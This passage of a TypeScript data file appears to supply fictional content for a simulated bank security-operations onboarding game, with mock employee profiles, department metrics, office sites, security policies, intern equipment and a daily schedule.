  experience: string;
  joinDate: string;
  skills: string[];
  certifications: string[];
  devices: string[];
  assets: string[];
  currentAssignment: string;
  activeIncidents: string[];
  careerPath: string;
  status: 'online' | 'away' | 'offline';
}

export const EMPLOYEE_DIRECTORY: EmployeeProfile[] = [
  { id: 'emp-001', employeeId: 'GFS-IN-00101', name: 'Rajesh Sharma', avatarInitials: 'RS', avatarColor: 'linear-gradient(135deg, #f59e0b, #d97706)', department: 'Executive', team: 'Board', title: 'Chief Executive Officer', manager: 'Board of Directors', location: 'Bengaluru HQ', email: 'rajesh.sharma@gfs.com', phone: '+91 80 4500 0001', experience: '28 years', joinDate: '2010-03-15', skills: ['Strategic Leadership', 'Banking Operations', 'Regulatory Affairs', 'Risk Management'], certifications: ['IIM Ahmedabad (MBA)', 'Certified Bank Manager'], devices: ['ThinkPad X1 Carbon', 'iPhone 15 Pro'], assets: ['Executive Laptop', 'VIP Access Badge', 'VIP Parking'], currentAssignment: 'Board strategy review — Q4 planning', activeIncidents: [], careerPath: 'CEO', status: 'online' },
  { id: 'emp-002', employeeId: 'GFS-IN-00201', name: 'Anand Iyer', avatarInitials: 'AI', avatarColor: 'linear-gradient(135deg, #00e5c7, #059669)', department: 'Cybersecurity Division', team: 'CISO Office', title: 'Chief Information Security Officer', manager: 'Rajesh Sharma (CEO)', location: 'Hyderabad SOC', email: 'anand.iyer@gfs.com', phone: '+91 40 4500 0010', experience: '20 years', joinDate: '2016-07-01', skills: ['Security Strategy', 'Risk Management', 'RBI Compliance', 'Incident Command', 'Board Reporting'], certifications: ['CISSP', 'CISM', 'ISO 27001 LA', 'PCI QSA'], devices: ['MacBook Pro 16"', 'iPhone 15 Pro'], assets: ['CISO Laptop', 'Building A Access', 'Security Clearance Level 5'], currentAssignment: 'Coordinating response to coordinated attack campaign', activeIncidents: ['ALT-2025-9001', 'ALT-2025-9002'], careerPath: 'CISO → Board → Consulting', status: 'online' },
  { id: 'emp-003', employeeId: 'GFS-IN-00301', name: 'Prakash Kulkarni', avatarInitials: 'PK', avatarColor: 'linear-gradient(135deg, #10b981, #059669)', department: 'SOC', team: 'SOC Leadership', title: 'SOC Director', manager: 'Anand Iyer (CISO)', location: 'Hyderabad SOC', email: 'prakash.kulkarni@gfs.com', phone: '+91 40 4500 0020', experience: '16 years', joinDate: '2018-01-15', skills: ['SOC Management', 'Threat Intelligence', 'SIEM Architecture', 'Team Building', 'KPI Development'], certifications: ['CISSP', 'GCIH', 'Splunk Certified', 'CRISC'], devices: ['Dell Latitude 7440', 'iPhone 14'], assets: ['SOC Director Laptop', 'Full Building Access', 'SC Level 4'], currentAssignment: 'Monthly security posture review — preparing board deck', activeIncidents: ['ALT-2025-9001'], careerPath: 'SOC Director → CISO Office → VP Cyber Defense', status: 'online' },
  { id: 'emp-004', employeeId: 'GFS-IN-00401', name: 'Suresh Reddy', avatarInitials: 'SR', avatarColor: 'linear-gradient(135deg, #00e5c7, #3b8bf5)', department: 'SOC', team: 'SOC Management', title: 'Senior SOC Manager', manager: 'Prakash Kulkarni (SOC Director)', location: 'Hyderabad SOC', email: 'suresh.reddy@gfs.com', phone: '+91 40 4500 0030', experience: '14 years', joinDate: '2019-04-01', skills: ['SOC Operations', 'Incident Management', 'Staff Mentoring', 'KQL Analytics', 'Shift Management'], certifications: ['GCIA', 'CEH', 'Splunk Certified', 'SC-200'], devices: ['Dell XPS 15', 'iPhone 13'], assets: ['Manager Laptop', 'SOC Floor Access', 'SC Level 3'], currentAssignment: 'Managing SOC response to coordinated attack — mentoring new intern', activeIncidents: ['ALT-2025-9001', 'ALT-2025-9002', 'ALT-2025-9003'], careerPath: 'SOC Manager → SOC Director → CISO Office', status: 'online' },
  { id: 'emp-005', employeeId: 'GFS-IN-00501', name: 'Arjun Sharma', avatarInitials: 'AS', avatarColor: 'linear-gradient(135deg, #f0a830, #f04848)', department: 'SOC', team: 'Tier 2/3 Investigation', title: 'SOC Team Lead — Tier 2/3', manager: 'Suresh Reddy', location: 'Hyderabad SOC', email: 'arjun.sharma@gfs.com', phone: '+91 40 4500 0040', experience: '8 years', joinDate: '2020-06-15', skills: ['Advanced Investigation', 'Threat Hunting', 'KQL', 'YARA', 'Wireshark', 'Mentoring'], certifications: ['GCIH', 'GCFA', 'CEH', 'OSCP'], assets: ['Analyst Laptop', 'SOC Floor Access', 'SC Level 3'], devices: ['Dell XPS 15', 'iPhone 14'], currentAssignment: 'Hunting for lateral movement in Loans dept — Cobalt Strike beacon pivot', activeIncidents: ['ALT-2025-9002'], careerPath: 'Team Lead → Threat Hunter Lead → SOC Manager', status: 'online' },
  { id: 'emp-006', employeeId: 'GFS-IN-00601', name: 'Sai Krishna', avatarInitials: 'SK', avatarColor: 'linear-gradient(135deg, #a78bfa, #ec4899)', department: 'Incident Response', team: 'IR Team', title: 'Incident Response Lead', manager: 'Prakash Kulkarni', location: 'Hyderabad SOC', email: 'sai.krishna@gfs.com', phone: '+91 40 4500 0050', experience: '10 years', joinDate: '2019-08-01', skills: ['Incident Response', 'Digital Forensics', 'Malware Analysis', 'IR Coordination', 'CERT-In Liaison'], certifications: ['GCFE', 'GCIH', 'CHFI', 'EnCE'], assets: ['Forensics Laptop', 'IR War Room Access', 'SC Level 4'], devices: ['Dell Precision 5680', 'iPhone 14'], currentAssignment: 'Coordinating ransomware containment — WRK-LOAN-047', activeIncidents: ['ALT-2025-9002', 'ALT-2025-9004'], careerPath: 'IR Lead → Security Architect → CISO Office', status: 'away' },
  { id: 'emp-007', employeeId: 'GFS-IN-00701', name: 'Harsha Vardhan', avatarInitials: 'HV', avatarColor: 'linear-gradient(135deg, #30d98a, #00e5c7)', department: 'Threat Intelligence', team: 'Threat Hunting', title: 'Threat Hunting Lead', manager: 'Prakash Kulkarni', location: 'Hyderabad SOC', email: 'harsha.vardhan@gfs.com', phone: '+91 40 4500 0060', experience: '9 years', joinDate: '2020-02-01', skills: ['Threat Hunting', 'APT Analysis', 'MITRE ATT&CK', 'MISP', 'KQL Advanced', 'OSINT'], certifications: ['GCTI', 'GCIA', 'CEH', 'CRTP'], assets: ['Analyst Laptop', 'SOC Floor Access', 'SC Level 3'], devices: ['Dell XPS 15', 'iPhone 13'], currentAssignment: 'Correlating Silk Typhoon indicators with DNS logs — C2 hunting', activeIncidents: ['ALT-2025-9006'], careerPath: 'Threat Hunter Lead → SOC Director → Consulting', status: 'online' },
  { id: 'emp-008', employeeId: 'GFS-IN-00801', name: 'Aditya Kulkarni', avatarInitials: 'AD', avatarColor: 'linear-gradient(135deg, #3b8bf5, #a78bfa)', department: 'Security Engineering', team: 'Engineering Leadership', title: 'Cloud & Security Engineering Lead', manager: 'Prakash Kulkarni', location: 'Pune Office', email: 'aditya.kulkarni@gfs.com', phone: '+91 20 4500 0070', experience: '11 years', joinDate: '2018-09-01', skills: ['Cloud Security', 'Azure', 'AWS', 'Kubernetes', 'Terraform', 'Security Architecture'], certifications: ['AWS Security Specialty', 'AZ-500', 'CKS', 'CISSP'], assets: ['Engineering Laptop', 'Pune Office Access', 'SC Level 3'], devices: ['MacBook Pro 14"', 'iPhone 14'], currentAssignment: 'Architecting zero-trust segmentation for AKS India cluster', activeIncidents: [], careerPath: 'Engineering Lead → VP Security Engineering → CTO Office', status: 'away' },
  { id: 'emp-009', employeeId: 'GFS-IN-00901', name: 'Raghav Sharma', avatarInitials: 'RS', avatarColor: 'linear-gradient(135deg, #f0a830, #30d98a)', department: 'SOC', team: 'Tier 1 Analysts', title: 'SOC Analyst — Tier 1', manager: 'Arjun Sharma', location: 'Hyderabad SOC', email: 'raghav.sharma@gfs.com', phone: '+91 40 4500 0080', experience: '2 years', joinDate: '2023-06-01', skills: ['Alert Triage', 'KQL Basics', 'Sentinel', 'Falcon', 'Ticket Management'], certifications: ['SC-900', 'CompTIA Security+'], assets: ['Analyst Workstation', 'SOC Floor Access', 'SC Level 2'], devices: ['Dell OptiPlex', 'GFS Phone'], currentAssignment: 'Triaging incoming alerts — 14 untriaged in queue', activeIncidents: ['ALT-2025-9003'], careerPath: 'Tier 1 → Tier 2 → Senior Analyst → Team Lead', status: 'online' },
  { id: 'emp-010', employeeId: 'GFS-IN-01001', name: 'Nikhil Joshi', avatarInitials: 'NJ', avatarColor: 'linear-gradient(135deg, #f04848, #f0a830)', department: 'Offensive Security', team: 'VAPT Team', title: 'VAPT Lead', manager: 'Anand Iyer (CISO)', location: 'Hyderabad SOC', email: 'nikhil.joshi@gfs.com', phone: '+91 40 4500 0090', experience: '7 years', joinDate: '2020-03-01', skills: ['Penetration Testing', 'Web App Testing', 'Cloud Testing', 'Vulnerability Management', 'Purple Teaming'], certifications: ['OSCP', 'OSCE3', 'GWAPT', 'CCSP'], assets: ['Testing Laptop', 'Red Team Lab Access', 'SC Level 3'], devices: ['ThinkPad X1 Extreme', 'iPhone 14'], currentAssignment: 'Quarterly penetration test — Internet Banking portal', activeIncidents: [], careerPath: 'VAPT Lead → Red Team Lead → CISO Office', status: 'online' },
  { id: 'emp-011', employeeId: 'GFS-IN-10452', name: 'You (Security Intern)', avatarInitials: 'SI', avatarColor: 'linear-gradient(135deg, #00e5c7, #3b8bf5)', department: 'SOC', team: 'Cyber Defense Internship', title: 'Security Intern', manager: 'Suresh Reddy', location: 'Hyderabad SOC', email: 'intern4721@gfs.com', phone: '+91 40 4500 9999', experience: 'Day 1', joinDate: new Date().toISOString().split('T')[0], skills: ['Networking Basics', 'Windows Basics', 'Linux Basics', 'Security Fundamentals'], certifications: [], assets: ['Intern Workstation', 'SOC Floor Access', 'SC Level 2'], devices: ['GFS Laptop (Dell Latitude 5540)', 'GFS Phone', 'VPN Token', 'Smart Card'], currentAssignment: 'Complete onboarding and begin first investigation — UPI fraud alert', activeIncidents: [], careerPath: 'Security Intern → SOC Analyst L1 → Ethical Hacker → VAPT Consultant', status: 'online' },
];

// ============================================================
// DEPARTMENTS (expanded with dashboards)
// ============================================================

export interface DepartmentDashboard {
  department: string;
  keyMetrics: { label: string; value: string; trend?: string }[];
  recentActivity: string[];
  openTickets: number;
  criticalAlerts: number;
  teamSize: number;
  toolsUsed: string[];
}

export const DEPARTMENT_DASHBOARDS: Record<string, DepartmentDashboard> = {
  'SOC': {
    department: 'Security Operations Center',
    keyMetrics: [
      { label: 'Open Alerts', value: '23', trend: '+15%' },
      { label: 'MTTD', value: '1.8 min', trend: '-12%' },
      { label: 'MTTR', value: '2.1 hours', trend: '-8%' },
      { label: 'Alert Fatigue Score', value: '34%', trend: '-5%' },
      { label: 'Analyst Utilization', value: '87%' },
      { label: 'Shift Coverage', value: '100%' },
    ],
    recentActivity: [
      'P1 incident: UPI fraud — 847 suspicious transactions (ALT-2025-9001)',
      'Ransomware containment: WRK-LOAN-047 isolated (ALT-2025-9002)',
      'Night → Day shift handover completed at 06:00 IST',
      'New intern onboarded to SOC platform — Day 1',
    ],
    openTickets: 23, criticalAlerts: 2, teamSize: 72,
    toolsUsed: ['Microsoft Sentinel', 'CrowdStrike Falcon', 'Splunk Enterprise', 'ServiceNow SIR', 'Wireshark', 'KQL', 'YARA'],
  },
  'Incident Response': {
    department: 'Incident Response',
    keyMetrics: [
      { label: 'Active IR Cases', value: '3' },
      { label: 'Avg Containment Time', value: '42 min' },
      { label: 'Evidence Items Secured', value: '12' },
      { label: 'CERT-In Reports Filed', value: '1' },
    ],
    recentActivity: [
      'WRK-LOAN-047 forensic acquisition completed',
      'Malware payload (stage2.ps1) submitted to sandbox',
      'IR bridge call scheduled for 14:00 IST',
    ],
    openTickets: 5, criticalAlerts: 2, teamSize: 18,
    toolsUsed: ['Volatility', 'Autopsy', 'Falcon Live Response', 'KAPE', 'Wireshark', 'YARA', 'FTK Imager'],
  },
  'Threat Intelligence': {
    department: 'Threat Intelligence',
    keyMetrics: [
      { label: 'IOCs Tracked', value: '42,847' },
      { label: 'Active Threat Actors', value: '12' },
      { label: 'TI Reports This Month', value: '8' },
      { label: 'ISAC Sharing Events', value: '3' },
    ],
    recentActivity: [
      'DarkShadow APT group profile updated',
      'RBI threat advisory: UPI fraud campaign — 5 banks affected',
      'IOC feed enrichment: 847 new indicators from ALT-2025-9001',
    ],
    openTickets: 4, criticalAlerts: 1, teamSize: 8,
    toolsUsed: ['MISP', 'Recorded Future', 'VirusTotal', 'Shodan', 'MITRE ATT&CK', 'RBI NISC-CIRT Feed'],
  },
  'Security Engineering': {
    department: 'Security Engineering',
    keyMetrics: [
      { label: 'Hardening Compliance', value: '94.2%' },
      { label: 'Automation Rules', value: '128' },
      { label: 'Open Projects', value: '6' },
      { label: 'Patch Compliance', value: '91.8%' },
    ],
    recentActivity: [
      'YARA rules updated for LockBit 3.0 variants',
      'Group Policy hardening for finance OU completed',
      'AKS RBAC audit in progress',
    ],
    openTickets: 8, criticalAlerts: 0, teamSize: 35,
    toolsUsed: ['Azure', 'AWS', 'Terraform', 'Ansible', 'Vault', 'GitLab', 'Jenkins', 'Docker'],
  },
  'Offensive Security': {
    department: 'Offensive Security (VAPT)',
    keyMetrics: [
      { label: 'Active Assessments', value: '2' },
      { label: 'Critical Findings', value: '4' },
      { label: 'Remediation Rate', value: '87%' },
      { label: 'Test Coverage', value: '72%' },
    ],
    recentActivity: [
      'Internet Banking pen test in progress — Phase 2',
      'API security assessment scheduled for next week',
      'Purple team exercise plan submitted',
    ],
    openTickets: 3, criticalAlerts: 0, teamSize: 12,
    toolsUsed: ['Burp Suite Pro', 'Nessus', 'Qualys', 'Metasploit', 'Nmap', 'SQLMap', 'BloodHound', 'Cobalt Strike'],
  },
  'Risk & Compliance': {
    department: 'Risk & Compliance',
    keyMetrics: [
      { label: 'Risk Score', value: '7.2/10' },
      { label: 'Open Audit Items', value: '14' },
      { label: 'PCI DSS Compliance', value: '96.8%' },
      { label: 'Policy Violations', value: '3' },
    ],
    recentActivity: [
      'PCI DSS v4.0 evidence collection in progress',
      'RBI quarterly cyber incident report filed',
      'Risk register updated for coordinated attack',
    ],
    openTickets: 14, criticalAlerts: 0, teamSize: 22,
    toolsUsed: ['GRC Platform', 'ServiceNow GRC', 'Qualys Policy Compliance', 'Excel', 'PowerPoint'],
  },
  'Cloud Operations': {
    department: 'Cloud Operations',
    keyMetrics: [
      { label: 'Cloud Spend', value: '₹42L/month' },
      { label: 'Resources Managed', value: '830+' },
      { label: 'Security Findings', value: '12' },
      { label: 'Data Residency', value: '100% India' },
    ],
    recentActivity: [
      'AWS S3 bucket audit — 14 public buckets found',
      'Azure Defender alerts reviewed',
      'RBI data localization compliance verified',
    ],
    openTickets: 6, criticalAlerts: 1, teamSize: 28,
    toolsUsed: ['Azure Portal', 'AWS Console', 'GuardDuty', 'Defender for Cloud', 'Terraform', 'CloudTrail'],
  },
  'Identity & Access': {
    department: 'Identity & Access Management',
    keyMetrics: [
      { label: 'Total Accounts', value: '42,847' },
      { label: 'Service Accounts', value: '2,847' },
      { label: 'MFA Coverage', value: '99.2%' },
      { label: 'PAM Requests', value: '28 today' },
    ],
    recentActivity: [
      'Service account audit initiated following ALT-2025-9003',
      'Conditional Access policy updated — geo-blocking non-IN IPs',
      'New intern access provisioned',
    ],
    openTickets: 9, criticalAlerts: 1, teamSize: 15,
    toolsUsed: ['Azure AD / Entra ID', 'PAM Solution', 'Azure AD Connect', 'Group Policy', 'PKI', 'MFA Service'],
  },
};

// ============================================================
// OFFICE LOCATIONS
// ============================================================

export interface OfficeLocation {
  id: string;
  name: string;
  city: string;
  type: 'headquarters' | 'soc' | 'datacenter' | 'cloud-ops' | 'dr-site' | 'regional' | 'branch-hub';
  address: string;
  floors: number;
  employees: number;
  criticalSystems: string[];
  description: string;
  securityLevel: string;
  highlights: string[];
  mapPosition: { x: number; y: number };
}

export const OFFICE_LOCATIONS: OfficeLocation[] = [
  {
    id: 'loc-blr', name: 'GFS Global Headquarters', city: 'Bengaluru', type: 'headquarters',
    address: 'Outer Ring Road, Marathahalli, Bengaluru, Karnataka 560103',
    floors: 18, employees: 12000, securityLevel: 'SC Level 5 — Restricted',
    criticalSystems: ['Executive Boardroom', 'CISO Office', 'Enterprise Architecture', 'Risk Committee Room'],
    description: 'Global headquarters of GFS. Houses the CEO office, CISO office, Board Room, Risk Committee, and enterprise architecture teams. 18 floors across two towers.',
    highlights: ['Executive Floor (Floor 18)', 'Board Room', 'Cafeteria (3 floors)', 'Gym & Recreation', 'Crèche', 'Executive Dining'],
    mapPosition: { x: 35, y: 65 },
  },
  {
    id: 'loc-hyd', name: 'India SOC — Gachibowli Cyber Hub', city: 'Hyderabad', type: 'soc',
    address: 'Cyber Towers, HITEC City, Gachibowli, Hyderabad, Telangana 500081',
    floors: 6, employees: 2800, securityLevel: 'SC Level 4 — High Security',
    criticalSystems: ['SOC War Room', 'SIEM Infrastructure', 'Fraud Detection Platform', 'Incident Response Lab', 'Threat Intelligence Center'],
    description: 'India\'s primary Security Operations Centre. 24/7 monitoring of all GFS systems. Houses SOC, Incident Response, Threat Intelligence, Fraud Operations, and VAPT teams.',
    highlights: ['SOC Floor (Floor 12)', 'IR War Room (Floor 12, Room 1204)', 'Training Center (Floor 11)', '24/7 Shift Operations', 'Biometric Access'],
    mapPosition: { x: 45, y: 55 },
  },
  {
    id: 'loc-mum', name: 'Mumbai Data Center', city: 'Mumbai', type: 'datacenter',
    address: 'Navi Mumbai DC, Airoli, Navi Mumbai, Maharashtra 400076',
    floors: 4, employees: 3200, securityLevel: 'SC Level 5 — Restricted (PCI CDE)',
    criticalSystems: ['Core Banking (FIS Profile)', 'NEFT/RTGS Gateway', 'SWIFT Alliance Lite2', 'PCI CDE', 'Treasury Systems', 'Mainframe'],
    description: 'Primary data center housing core banking systems, payment gateways, and PCI Cardholder Data Environment. Tier 4 facility with 99.999% uptime SLA.',
    highlights: ['Server Room (Floor 1)', 'PCI CDE (Floor 2)', 'Network Operations (Floor 3)', 'DR Control Room', '24/7 Security', 'Visitor Escort Required'],
    mapPosition: { x: 32, y: 42 },
  },
  {
    id: 'loc-pune', name: 'Cloud & Engineering Center', city: 'Pune', type: 'cloud-ops',
    address: 'IT Park, Hinjewadi Phase 3, Pune, Maharashtra 411057',
    floors: 5, employees: 5200, securityLevel: 'SC Level 3 — Standard',
    criticalSystems: ['Cloud Infrastructure', 'Azure DevOps', 'CI/CD Pipelines', 'Container Registry', 'Security Engineering Labs'],
    description: 'Cloud operations, application development, and security engineering center. Manages Azure and AWS infrastructure, Kubernetes clusters, and DevOps pipelines.',
    highlights: ['Cloud NOC (Floor 5)', 'Dev Labs (Floor 3)', 'Security Engineering (Floor 4)', 'Innovation Center', 'Collaboration Spaces'],
    mapPosition: { x: 38, y: 50 },
  },
  {
    id: 'loc-chen', name: 'Chennai Disaster Recovery Site', city: 'Chennai', type: 'dr-site',
    address: 'IT Corridor, Sholinganallur, Chennai, Tamil Nadu 600119',
    floors: 3, employees: 3400, securityLevel: 'SC Level 4 — High Security',
    criticalSystems: ['DR Core Banking', 'Backup Systems', 'Replication Links', 'DR Command Center'],
    description: 'Disaster recovery site mirroring Mumbai DC. Maintains real-time replication for core banking, NEFT/RTGS, and payment systems. Activated during DR exercises.',
    highlights: ['DR Command Center', 'Server Room', 'Testing Lab', 'DR Exercise Area', 'Standby SOC'],
    mapPosition: { x: 48, y: 58 },
  },
  {
    id: 'loc-del', name: 'Delhi Regional Office', city: 'Delhi', type: 'regional',
    address: 'Connaught Place, New Delhi 110001',
    floors: 3, employees: 4800, securityLevel: 'SC Level 2 — Standard',
    criticalSystems: ['Regional CRM', 'Government Banking', 'Regional Analytics'],
    description: 'North India regional office. Handles government banking relationships, corporate accounts in NCR region, and regional operations management.',
    highlights: ['Executive Suite', 'Government Relations', 'Client Meeting Rooms', 'Regional Analytics Center'],
    mapPosition: { x: 40, y: 30 },
  },
  {
    id: 'loc-ccu', name: 'Kolkata Regional Office', city: 'Kolkata', type: 'regional',
    address: 'Salt Lake Sector V, Kolkata, West Bengal 700091',
    floors: 2, employees: 2200, securityLevel: 'SC Level 2 — Standard',
    criticalSystems: ['Regional Operations', 'Branch Management'],
    description: 'East India regional office managing operations across West Bengal, Odisha, Bihar, and North-East states.',
    highlights: ['Regional Operations', 'Branch Coordination', 'Training Wing'],
    mapPosition: { x: 62, y: 38 },
  },
  {
    id: 'loc-ahm', name: 'Ahmedabad Regional Office', city: 'Ahmedabad', type: 'regional',
    address: 'SG Highway, Ahmedabad, Gujarat 380015',
    floors: 2, employees: 2800, securityLevel: 'SC Level 2 — Standard',
    criticalSystems: ['Regional Operations', 'SME Banking'],
    description: 'West India regional office. Focuses on SME banking, retail operations in Gujarat and Rajasthan.',
    highlights: ['SME Banking Center', 'Regional Operations', 'Client Engagement'],
    mapPosition: { x: 28, y: 45 },
  },
  {
    id: 'loc-viz', name: 'Visakhapatnam Development Center', city: 'Visakhapatnam', type: 'regional',
    address: 'IT SEZ, Madhurawada, Visakhapatnam, Andhra Pradesh 530048',
    floors: 2, employees: 1600, securityLevel: 'SC Level 2 — Standard',
    criticalSystems: ['Development Center', 'Testing Labs'],
    description: 'Application development and testing center. Focuses on mobile banking app development and QA automation.',
    highlights: ['Dev Center', 'QA Labs', 'Mobile Testing', 'Innovation Hub'],
    mapPosition: { x: 52, y: 52 },
  },
];

// ============================================================
// COMPANY POLICIES
// ============================================================

export interface Policy {
  id: string;
  title: string;
  category: string;
  version: string;
  lastUpdated: string;
  owner: string;
  summary: string;
  keyPoints: string[];
  applicableTo: string;
}

export const COMPANY_POLICIES: Policy[] = [
  {
    id: 'pol-001', title: 'Information Security Policy', category: 'Security', version: '5.2',
    lastUpdated: '2024-11-01', owner: 'Anand Iyer (CISO)', applicableTo: 'All GFS Employees',
    summary: 'Master security policy governing all information assets at GFS. Covers data classification, access control, encryption, network security, and incident response requirements.',
    keyPoints: ['All GFS data must be classified (Public, Internal, Confidential, Restricted)', 'Confidential and Restricted data must be encrypted at rest and in transit', 'Access follows principle of least privilege', 'All security incidents must be reported within 1 hour', 'Annual security awareness training mandatory for all employees', 'Remote work must use GFS-approved VPN only'],
  },
  {
    id: 'pol-002', title: 'Acceptable Use Policy', category: 'Security', version: '4.1',
    lastUpdated: '2024-09-15', owner: 'Deepa Nair (CCO)', applicableTo: 'All GFS Employees',
    summary: 'Defines acceptable and unacceptable use of GFS computing resources, networks, and data.',
    keyPoints: ['GFS equipment is for business use; limited personal use permitted', 'No unauthorized software installation', 'No personal USB devices on PCI CDE systems', 'No use of personal email for GFS business', 'Social media must not reference GFS customers or data', 'All internet traffic is monitored and logged'],
  },
  {
    id: 'pol-003', title: 'Incident Reporting Policy', category: 'Security', version: '3.0',
    lastUpdated: '2024-10-01', owner: 'Prakash Kulkarni (SOC Director)', applicableTo: 'All GFS Employees',
    summary: 'Mandatory incident reporting requirements including RBI, CERT-In, and NPCI notification timelines.',
    keyPoints: ['Report security incidents within 1 hour of discovery', 'P1 incidents: immediate SOC escalation + CISO notification', 'RBI reporting: within 6 hours for critical incidents', 'CERT-In reporting: within 6 hours for significant cyber incidents', 'NPCI notification: required for UPI-related security incidents', 'Preserve all evidence — do not alter or delete logs'],
  },
  {
    id: 'pol-004', title: 'Remote Work Security Policy', category: 'Workplace', version: '2.3',
    lastUpdated: '2024-08-01', owner: 'Anand Iyer (CISO)', applicableTo: 'All GFS Employees',
    summary: 'Security requirements for remote and hybrid working arrangements.',
    keyPoints: ['GFS VPN required for all remote access', 'Multi-factor authentication mandatory for remote login', 'GFS-issued laptop only — no personal devices for work', 'Home network must use WPA3 encryption', 'No public WiFi for accessing GFS systems', 'Clean desk policy applies even at home'],
  },
  {
    id: 'pol-005', title: 'Data Classification Policy', category: 'Data Protection', version: '3.1',
    lastUpdated: '2024-07-15', owner: 'Deepa Nair (CCO)', applicableTo: 'All GFS Employees',
    summary: 'Framework for classifying and protecting GFS data based on sensitivity and regulatory requirements.',
    keyPoints: ['RESTRICTED: Card data, SWIFT credentials, encryption keys — strictest controls', 'CONFIDENTIAL: Customer PII, financial data, internal reports — need-to-know basis', 'INTERNAL: Policies, procedures, internal communications — GFS employees only', 'PUBLIC: Marketing materials, press releases — no restrictions', 'DPDP Act compliance for personal data handling'],
  },
  {
    id: 'pol-006', title: 'Code of Conduct', category: 'Culture', version: '6.0',
    lastUpdated: '2024-06-01', owner: 'Kavitha Rao (CHRO)', applicableTo: 'All GFS Employees',
    summary: 'Ethical standards, professional behavior, and compliance expectations for all GFS employees.',
    keyPoints: ['Treat all colleagues, customers, and partners with respect', 'No tolerance for discrimination or harassment', 'Report conflicts of interest immediately', 'Maintain confidentiality of customer and business information', 'Zero tolerance for fraud, bribery, or corruption', 'Annual code of conduct acknowledgement required'],
  },
];

// ============================================================
// EQUIPMENT
// ============================================================

export interface EquipmentItem {
  id: string;
  name: string;
  type: 'laptop' | 'phone' | 'token' | 'badge' | 'account' | 'software';
  icon: string;
  details: string;
  serialNumber?: string;
  status: 'active' | 'pending' | 'maintenance';
  assignedDate: string;
  description: string;
  linkedModule?: string;
}

export const MY_EQUIPMENT: EquipmentItem[] = [
  { id: 'eq-001', name: 'GFS Laptop', type: 'laptop', icon: '💻', details: 'Dell Latitude 5540', serialNumber: 'GFS-LT-2025-4721', status: 'active', assignedDate: new Date().toISOString(), description: 'Your primary work laptop. Pre-configured with GFS security policies, CrowdStrike Falcon agent, Microsoft 365, and VPN client. Full disk encryption (BitLocker) enabled.' },
  { id: 'eq-002', name: 'GFS Mobile Phone', type: 'phone', icon: '📱', details: 'iPhone 15', serialNumber: 'GFS-PH-2025-4721', status: 'active', assignedDate: new Date().toISOString(), description: 'Company mobile phone with GFS MDM profile installed. Required for Microsoft Authenticator MFA and Teams communication.' },
  { id: 'eq-003', name: 'VPN Token', type: 'token', icon: '🔑', details: 'RSA SecurID', serialNumber: 'GFS-VPN-4721', status: 'active', assignedDate: new Date().toISOString(), description: 'Hardware VPN token for secure remote access. Required for connecting to GFS network from outside the office.' },
  { id: 'eq-004', name: 'Smart Card', type: 'badge', icon: '🪪', details: 'GFS Employee ID Card', serialNumber: 'GFS-ID-4721', status: 'active', assignedDate: new Date().toISOString(), description: 'Physical access card for building entry, server room access, and PCI CDE zone access. Contains your employee photo and RFID chip.' },
  { id: 'eq-005', name: 'Microsoft 365 Account', type: 'account', icon: '📧', details: 'intern4721@gfs.com', status: 'active', assignedDate: new Date().toISOString(), description: 'Full Microsoft 365 access including Outlook email, Teams, SharePoint, OneDrive, and all enterprise applications.' },
  { id: 'eq-006', name: 'SOC Console Access', type: 'account', icon: '🖥️', details: 'Sentinel + Falcon + ServiceNow', status: 'active', assignedDate: new Date().toISOString(), description: 'Read-only access to Microsoft Sentinel, CrowdStrike Falcon, and ServiceNow SOC module. Sufficient for alert triage and investigation.' },
  { id: 'eq-007', name: 'Security Software', type: 'software', icon: '🛡️', details: 'Falcon + Defender + VPN', status: 'active', assignedDate: new Date().toISOString(), description: 'CrowdStrike Falcon EDR, Microsoft Defender for Endpoint, GlobalProtect VPN client, and BitLocker encryption pre-installed on your laptop.' },
];

// ============================================================
// DAILY SCHEDULE
// ============================================================

export interface ScheduleItem {
  time: string;
  endTime: string;
  title: string;
  type: 'meeting' | 'work' | 'training' | 'break' | 'review';
  location: string;
  description: string;
  attendees?: string[];
  recurring: boolean;
}

export const DAILY_SCHEDULE: ScheduleItem[] = [
  { time: '09:00', endTime: '09:30', title: 'Morning Briefing', type: 'meeting', location: 'SOC War Room — Floor 12, Room 1204', description: 'Night shift hands over to Day shift. Review overnight alerts, P1 incidents, and open investigations.', attendees: ['Suresh Reddy', 'Arjun Sharma', 'All SOC Analysts'], recurring: true },
  { time: '09:30', endTime: '10:30', title: 'Alert Review & Triage', type: 'work', location: 'SOC Floor — Your Workstation', description: 'Review new alerts in Sentinel. Perform initial triage. Classify by severity and assign to appropriate investigation queue.', recurring: true },
  { time: '10:30', endTime: '11:30', title: 'Threat Intelligence Briefing', type: 'meeting', location: 'TI Center — Floor 12, Room 1210', description: 'Harsha Vardhan presents latest threat intelligence. Review new IOCs, APT activity, and RBI advisories.', attendees: ['Harsha Vardhan', 'Varun Choudhary', 'SOC Team'], recurring: true },
  { time: '11:30', endTime: '13:00', title: 'Investigation Work', type: 'work', location: 'SOC Floor — Your Workstation', description: 'Work on assigned investigations. Analyze logs, build timelines, document findings in ServiceNow.', recurring: true },
  { time: '13:00', endTime: '14:00', title: 'Lunch Break', type: 'break', location: 'GFS Cafeteria — Floor 3', description: 'Lunch at the GFS cafeteria. Veg and non-veg options available. South Indian, North Indian, and Continental cuisines.', recurring: true },
  { time: '14:00', endTime: '15:00', title: 'Lab / Training Session', type: 'training', location: 'Training Center — Floor 11', description: 'Complete assigned training modules. Hands-on labs with Sentinel, Falcon, and network analysis tools.', recurring: true },
  { time: '15:00', endTime: '16:30', title: 'Case Review & Documentation', type: 'work', location: 'SOC Floor — Your Workstation', description: 'Document investigation findings. Update ticket status. Prepare case summaries for manager review.', recurring: true },
  { time: '16:30', endTime: '17:00', title: 'Manager 1:1 Review', type: 'review', location: 'Manager\'s Desk — SOC Floor', description: 'Daily check-in with Suresh Reddy. Review progress, discuss challenges, get guidance on investigations.', attendees: ['Suresh Reddy'], recurring: true },
  { time: '17:00', endTime: '17:30', title: 'Shift Preparation', type: 'work', location: 'SOC Floor', description: 'Prepare handover notes for Evening Shift. Update all open tickets with current status.', recurring: true },
];

// ============================================================
// ENTERPRISE NEWS
// ============================================================

export interface NewsItem {
  id: string;
  title: string;
  category: 'security' | 'operations' | 'hr' | 'compliance' | 'technology' | 'general';
  priority: 'critical' | 'high' | 'normal' | 'low';
  timestamp: string;
  summary: string;
  source: string;
  author: string;
  impact: string;
  relatedAlerts?: string[];
}

export const ENTERPRISE_NEWS: NewsItem[] = [
